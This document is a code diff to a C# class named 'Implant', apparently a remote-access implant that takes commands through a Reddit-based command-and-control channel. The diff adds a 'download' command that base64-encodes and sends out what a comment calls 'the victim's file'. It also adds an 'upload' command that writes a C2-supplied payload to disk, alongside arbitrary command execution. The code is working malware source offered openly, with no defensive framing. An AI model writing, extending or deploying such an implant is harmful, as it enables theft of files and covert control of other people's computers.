@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -11,10 +11,34 @@ using System.Collections;
 using System.Xml.Linq;
 using System.Diagnostics;
 using System.Globalization;
+using System.IO;
+using static System.Net.Mime.MediaTypeNames;
 
 
 public class Implant
 {
+    public static void Base64ToFile(string base64String, string fileName)
+    {
+        // Convert base64 string to byte array
+        byte[] fileBytes = Convert.FromBase64String(base64String);
+
+        // Write bytes to file
+        using (FileStream fs = new FileStream(fileName, FileMode.Create))
+        {
+            fs.Write(fileBytes, 0, fileBytes.Length);
+        }
+    }
+
+    public static string EncodeFileToBase64(string fileName)
+    {
+        using (var fs = new FileStream(fileName, FileMode.Open))
+        {
+            var bytes = new byte[fs.Length];
+            fs.Read(bytes, 0, (int)fs.Length);
+            return Convert.ToBase64String(bytes);
+        }
+    }
+
     public static string Encrypt(string message, string key)
     {
         int keyLength = key.Length;
@@ -65,10 +89,26 @@ public class Implant
         {
             string output = "";
             string command = readTask(username, password, subreddit, listenerID, xorkey);
-            //Console.WriteLine(command);
-            output = runTask(command);
-            //Console.WriteLine(output);
-            sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
+            Console.WriteLine(command);
+            if (command.Substring(0, 8) == "download") //base64 the victim's file
+            {
+                string filename = command.Remove(0, 9);
+                output = EncodeFileToBase64(filename);
+                sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
+            }
+            else if (command.Substring(0, 6) == "upload")
+            {
+                string[] words = command.Split(' ');
+
+                string fileContent = command.Substring(6);
+                Base64ToFile(words[2], words[1]); //convert the retrieved base64 from c2 to a file
+                sendOutput(command, "[+] File uploaded successfully", username, password, subreddit, listenerID, xorkey);
+            }
+            else
+            {
+                output = runTask(command);
+                sendOutput(command, output, username, password, subreddit, listenerID, xorkey);
+            }
         }
     }
 
@@ -184,3 +224,4 @@ public class Implant
         }
     }
 }
+
